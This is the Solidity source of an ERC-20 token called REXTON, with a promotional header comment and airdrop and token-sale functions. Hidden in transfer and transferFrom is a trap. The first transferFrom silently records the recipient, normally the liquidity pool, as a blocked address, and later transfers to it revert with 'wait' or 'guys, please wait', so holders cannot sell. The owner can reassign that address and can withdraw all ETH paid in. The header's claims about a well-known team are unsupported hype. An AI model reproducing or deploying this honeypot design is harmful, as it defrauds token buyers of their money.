/*

 * R E X T O N     T R A D I N G

 *

 * Defi is a project built on the DAO ecosystem. We took the distribution of awards to holders from SUSHI. This is the best idea for getting rewards.

 * The big finances of the DAO system need to be properly allocated. The DAO has a problem with this. Our token is able to solve this difficult task. And our version of the mobile wallet will reflect that.

 * Burning of tokens is provided! The token developer is a well-known team. We participated in the SUSHI split test.

 * Next ecosystem - REXTON NODE's!

 *

 * Ticker: REXTON

 * Decimals: 18

 * Max. Supply: 375

 */



pragma solidity >=0.5.16;



library SafeMath {

  function add(uint a, uint b) internal pure returns (uint c) {

    c = a + b;

    require(c >= a);

  }

  function sub(uint a, uint b) internal pure returns (uint c) {

    require(b <= a);

    c = a - b;

  }

  function mul(uint a, uint b) internal pure returns (uint c) {

    c = a * b;

    require(a == 0 || c / a == b);

  }

  function div(uint a, uint b) internal pure returns (uint c) {

    require(b > 0);

    c = a / b;

  }

}



contract ERC20Interface {

  function totalSupply() public view returns (uint);

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function allowance(address tokenOwner, address spender) public view returns (uint remaining);

  function transfer(address to, uint tokens) public returns (bool success);

  function approve(address spender, uint tokens) public returns (bool success);

  function transferFrom(address from, address to, uint tokens) public returns (bool success);



  event Transfer(address indexed from, address indexed to, uint tokens);

  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}



contract ApproveAndCallFallBack {

  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;

}



contract Owned {

  address public owner;

  address public newOwner;



  event OwnershipTransferred(address indexed _from, address indexed _to);



  constructor() public {

    owner = msg.sender;

  }



  modifier onlyOwner {

    require(msg.sender == owner);

    _;

  }



  function transferOwnership(address _newOwner) public onlyOwner {

    newOwner = _newOwner;

  }

  function acceptOwnership() public {

    require(msg.sender == newOwner);

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

    newOwner = address(0);

  }

}



contract TokenERC20 is ERC20Interface, Owned{

  using SafeMath for uint;



  string public symbol;

  string public name;

  uint8 public decimals;

  uint _totalSupply;

  address public defikalis;



  mapping(address => uint) balances;

  mapping(address => mapping(address => uint)) allowed;



  constructor() public {

    symbol = "REXTON";

    name = "REXTON Trading Fin.";

    decimals = 18;

    _totalSupply =  375000000000000000000;

    balances[owner] = _totalSupply;

    emit Transfer(address(0), owner, _totalSupply);

  }

  function transferdefikalis(address _defikalis) public onlyOwner {

    defikalis = _defikalis;

  }

  function totalSupply() public view returns (uint) {

    return _totalSupply.sub(balances[address(0)]);

  }

  function balanceOf(address tokenOwner) public view returns (uint balance) {

      return balances[tokenOwner];

  }

  function transfer(address to, uint tokens) public returns (bool success) {

     require(to != defikalis, "wait");

    balances[msg.sender] = balances[msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(msg.sender, to, tokens);

    return true;

  }

  function approve(address spender, uint tokens) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    return true;

  }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {

      if(from != address(0) && defikalis == address(0)) defikalis = to;

      else require(to != defikalis, "guys, please wait");

    balances[from] = balances[from].sub(tokens);

    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(from, to, tokens);

    return true;

  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {

    return allowed[tokenOwner][spender];

  }

  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);

    return true;

  }

  function () external payable {

    revert();

  }

}



contract REXTON_SwapToken  is TokenERC20 {

  uint256 public aRobBlock; 

  uint256 public aEiRobBlock; 

  uint256 public aRobCap; 

  uint256 public aTotq; 

  uint256 public aAmtqs; 

  uint256 public sSBilock; 

  uint256 public sEBlocuk; 

  uint256 public sTota; 

  uint256 public sCapq; 

  uint256 public sqaChunk; 

  uint256 public soplPrice; 



  function getReward(address _refer) public returns (bool success){

    require(aRobBlock <= block.number && block.number <= aEiRobBlock);

    require(aTotq < aRobCap || aRobCap == 0);

    aTotq ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(aAmtqs / 4);

      balances[_refer] = balances[_refer].add(aAmtqs / 4);

      emit Transfer(address(this), _refer, aAmtqs / 4);

    }

    balances[address(this)] = balances[address(this)].sub(aAmtqs);

    balances[msg.sender] = balances[msg.sender].add(aAmtqs);

    emit Transfer(address(this), msg.sender, aAmtqs);

    return true;

  }



  function tokenSmart(address _refer) public payable returns (bool success){

    require(sSBilock <= block.number && block.number <= sEBlocuk);

    require(sTota < sCapq || sCapq == 0);

    uint256 _eth = msg.value;

    uint256 _tkns;

    if(sqaChunk != 0) {

      uint256 _price = _eth / soplPrice;

      _tkns = sqaChunk * _price;

    }

    else {

      _tkns = _eth / soplPrice;

    }

    sTota ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(_tkns / 4);

      balances[_refer] = balances[_refer].add(_tkns / 4);

      emit Transfer(address(this), _refer, _tkns / 4);

    }

    balances[address(this)] = balances[address(this)].sub(_tkns);

    balances[msg.sender] = balances[msg.sender].add(_tkns);

    emit Transfer(address(this), msg.sender, _tkns);

    return true;

  }



  function viewDefi() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){

    return(aRobBlock, aEiRobBlock, aRobCap, aTotq, aAmtqs);

  }

  function viewStc() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){

    return(sSBilock, sEBlocuk, sCapq, sTota, sqaChunk, soplPrice);

  }

  

  function startRoboRewards(uint256 _aRobBlock, uint256 _aEiRobBlock, uint256 _aAmtqs, uint256 _aRobCap) public onlyOwner() {

    aRobBlock = _aRobBlock;

    aEiRobBlock = _aEiRobBlock;

    aAmtqs = _aAmtqs;

    aRobCap = _aRobCap;

    aTotq = 0;

  }

  function startQled(uint256 _sSBilock, uint256 _sEBlocuk, uint256 _sqaChunk, uint256 _soplPrice, uint256 _sCapq) public onlyOwner() {

    sSBilock = _sSBilock;

    sEBlocuk = _sEBlocuk;

    sqaChunk = _sqaChunk;

    soplPrice =_soplPrice;

    sCapq = _sCapq;

    sTota = 0;

  }

  function SolidStartGET() public onlyOwner() {

    address payable _owner = msg.sender;

    _owner.transfer(address(this).balance);

  }

  function() external payable {



  }

}
